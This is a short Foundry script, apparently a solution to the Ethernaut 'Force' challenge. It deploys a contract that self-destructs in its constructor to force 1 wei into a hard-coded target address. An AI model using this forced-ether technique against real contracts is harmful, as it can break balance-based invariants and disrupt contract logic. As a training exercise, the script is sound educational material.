pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

contract ToBeDestructed {
    constructor(address payable _forceAddress) payable {
        selfdestruct(_forceAddress);
    }
}

contract ForceSolution is Script {

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new ToBeDestructed{value: 1 wei}(payable(0xc6cDa8133104110a4B6b0FFae84cF814719Edf49));
        vm.stopBroadcast();
    }
}